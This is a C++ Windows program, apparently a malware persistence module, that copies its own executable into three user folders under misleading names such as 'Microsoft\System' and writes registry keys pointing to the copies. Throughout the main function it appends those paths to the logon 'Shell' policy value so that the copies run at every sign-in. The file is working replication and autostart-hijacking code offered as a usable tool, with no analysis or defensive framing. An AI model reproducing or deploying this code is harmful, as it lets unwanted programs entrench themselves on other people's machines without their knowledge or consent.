#include <iostream>
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <string>

#pragma comment(lib, "shell32.lib")

void enableVTMode() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

void gradientAdder3(const std::string& text, int r1, int g1, int b1, int r2, int g2, int b2) {
    size_t len = text.length();
    for (size_t i = 0; i < len; ++i) {
        int r = r1 + (r2 - r1) * static_cast<int>(i) / static_cast<int>(len);
        int g = g1 + (g2 - g1) * static_cast<int>(i) / static_cast<int>(len);
        int b = b1 + (b2 - b1) * static_cast<int>(i) / static_cast<int>(len);
        std::cout << "\033[38;2;" << r << ";" << g << ";" << b << "m" << text[i];
    }
    std::cout << "\033[0m\n";
}

void Success3() {
    std::cout << "\033[38;2;0;255;0m[+] \033[38;2;144;238;144mExe was replicated and added registry keys\033[0m\n";
}

void Failed3(DWORD error = 0) {
    std::cout << "\033[38;2;139;0;0m[-] \033[38;2;255;0;0mFailed to replicate exe or add to registry keys. Error: " << error << "\033[0m\n";
}

void There3() {
    gradientAdder3("[=] Exe is already in  registry keys", 255, 140, 0, 255, 255, 0);
}

int main() {
    enableVTMode();
    const std::string appName = "Inputt"; // name of app
    const std::string locations[3] = { // where it will be added
        std::string("Inputt On Top"),
        std::string("Microsoft\\System"),
        std::string("Documents\\Utils")
    };
    const std::string regKeys[3] = {
        "Software\\InputtStartup",
        "Environment",
        "Software\\Microsoft\\InputtConfig"
    };
    const std::string policyKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        Failed3(GetLastError());
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 1;
    }

    std::string destPaths[3];
    for (int i = 0; i < 3; ++i) {
        char basePath[MAX_PATH];
        int folderId = (i == 0) ? CSIDL_LOCAL_APPDATA : (i == 1) ? CSIDL_APPDATA : CSIDL_PROFILE;
        if (FAILED(SHGetFolderPathA(NULL, folderId, NULL, 0, basePath))) {
            Failed3(GetLastError());
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 1;
        }
        std::filesystem::path destDir = std::filesystem::path(basePath) / locations[i];
        destPaths[i] = (destDir / (appName + ".exe")).string();
        try {
            std::filesystem::create_directories(destDir);
            if (!std::filesystem::exists(destPaths[i]) || !std::filesystem::equivalent(exePath, destPaths[i])) {
                std::filesystem::copy_file(exePath, destPaths[i], std::filesystem::copy_options::overwrite_existing);
            }
        }
        catch (...) {
            Failed3();
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 1;
        }
    }

    for (int i = 0; i < 3; ++i) {
        HKEY hKey;
        LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, regKeys[i].c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
        if (result != ERROR_SUCCESS) {
            Failed3(result);
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 1;
        }
        result = RegSetValueExA(hKey, "StartupPath", 0, REG_SZ, (const BYTE*)destPaths[i].c_str(), static_cast<DWORD>(destPaths[i].length() + 1));
        RegCloseKey(hKey);
        if (result != ERROR_SUCCESS) {
            Failed3(result);
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 1;
        }
    }

    HKEY hPolicyKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, policyKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hPolicyKey, NULL);
    if (result != ERROR_SUCCESS) {
        Failed3(result);
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 1;
    }

    char regValue[2048];
    DWORD regValueSize = sizeof(regValue);
    result = RegQueryValueExA(hPolicyKey, "Shell", NULL, NULL, (LPBYTE)regValue, &regValueSize);
    std::string currentShell = (result == ERROR_SUCCESS) ? regValue : "explorer.exe";
    std::string newShell = currentShell;
    bool alreadyExists = true;
    for (const auto& path : destPaths) {
        if (currentShell.find(path) == std::string::npos) {
            alreadyExists = false;
            if (!newShell.empty()) newShell += ",";
            newShell += path;
        }
    }

    if (!alreadyExists) {
        result = RegSetValueExA(hPolicyKey, "Shell", 0, REG_SZ, (const BYTE*)newShell.c_str(), static_cast<DWORD>(newShell.length() + 1));
        if (result != ERROR_SUCCESS) {
            RegCloseKey(hPolicyKey);
            Failed3(result);
            std::cout << "Press Enter to exit...";
            std::cin.get();
            return 1;
        }
        Success3();
    }
    else {
        There3();
    }

    RegCloseKey(hPolicyKey);
    std::cout << "Press Enter to exit...";
    std::cin.get();

    return 0;
}
